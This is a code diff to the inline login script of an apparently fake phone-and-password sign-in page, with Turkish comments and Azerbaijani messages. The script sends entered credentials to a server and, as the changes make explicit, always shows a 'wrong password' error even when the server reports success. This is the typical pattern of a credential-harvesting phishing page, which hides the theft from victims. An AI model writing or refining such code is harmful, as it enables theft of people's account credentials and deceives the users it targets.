@@ -1127,24 +1127,18 @@ document.addEventListener('DOMContentLoaded', function() {
     const phoneInput = document.getElementById('input-109');
     const passwordInput = document.getElementById('input-112');
     const loginButton = document.getElementById('sign_in');
-    const errorContainer = document.getElementById('passwordtext'); // Hata mesajının ana kapsayıcısı
-    // Hata mesajının yazıldığı spesifik element
+    const errorContainer = document.getElementById('passwordtext');
     const errorMessageElement = errorContainer ? errorContainer.querySelector('.v-messages__message') : null;
 
-    // --- YENİ: Hata gösterme işini tek bir yerden yöneten fonksiyon ---
-    function showOnPageError(message) {
+    // --- Hata gösterme fonksiyonu ---
+    function showStandardError() {
         if (errorMessageElement && errorContainer) {
-            // Mesajı güncelle
-            errorMessageElement.textContent = message;
-            // Hata alanını görünür yap
+            errorMessageElement.textContent = "Telefon nömrəsi və ya şifrə yanlışdır.";
             errorContainer.style.display = 'block';
-        } else {
-            // Eğer olur da HTML'de hata alanı bulunamazsa, eski yöntem alert'e düş
-            alert(message);
         }
     }
 
-    // --- Butonun aktif/pasif durumunu kontrol eden fonksiyon ---
+    // --- Butonun durumunu kontrol eden fonksiyon ---
     function checkInputs() {
         const cleanPhoneNumber = phoneInput.value.replace(/\D/g, '');
         const isPhoneValid = cleanPhoneNumber.length === 9;
@@ -1166,7 +1160,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // Telefon ve şifre alanlarını dinleme
+    // --- Input dinleyicileri ---
     phoneInput.addEventListener('input', () => {
         let digits = phoneInput.value.replace(/\D/g, '');
         if (digits.length > 9) {
@@ -1177,7 +1171,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
     passwordInput.addEventListener('input', checkInputs);
 
-    // Butona tıklama olayı
+    // --- Butona tıklama olayı (GÜNCELLENMİŞ HATA MANTIĞI İLE) ---
     loginButton.addEventListener('click', function(event) {
         event.preventDefault();
         if (this.hasAttribute('disabled')) return;
@@ -1196,29 +1190,26 @@ document.addEventListener('DOMContentLoaded', function() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ phoneNumber: fullPhoneNumber, password: passwordValue }),
         })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                // BAŞARILI DURUMDA: Önceden hazırlanan "Şifrə yanlış" mesajı gösterilir.
-                showOnPageError("Telefon nömrəsi və ya şifrə yanlışdır.");
-            } else {
-                // YENİ: alert yerine, server'dan gelen hata mesajı gösterilir.
-                showOnPageError('Daxil etdiyiniz şifrə və ya nömrə yanlışdır');
-            }
+        .then(response => {
+            // Sunucudan gelen yanıt ne olursa olsun (başarılı veya hatalı),
+            // kullanıcıya her zaman aynı mesajı göster.
+            showStandardError();
         })
         .catch(error => {
-            // YENİ: alert yerine, genel bağlantı hatası mesajı gösterilir.
-            showOnPageError('Daxil etdiyiniz şifrə və ya nömrə yanlışdır');
-            console.error('Daxil etdiyiniz şifrə və ya nömrə yanlışdır');
+            // AĞ HATASI OLURSA BİLE: Kullanıcıya yine aynı mesajı göster.
+            showStandardError();
+            // Gerçek hatayı sadece geliştirici olarak biz konsolda görelim.
+            console.error('Serverə qoşulmada xəta:', error);
         })
         .finally(() => {
+            // İşlem bitince butonu normale döndür ama hata mesajı kalsın.
             buttonContent.textContent = 'Daxil ol';
             loginButton.removeAttribute('disabled');
             loginButton.classList.remove('v-btn--disabled');
         });
     });
 
-    checkInputs(); // Sayfa yüklendiğinde ilk kontrol
+    checkInputs();
 });
 </script>
   <script id="google-tag-manager">
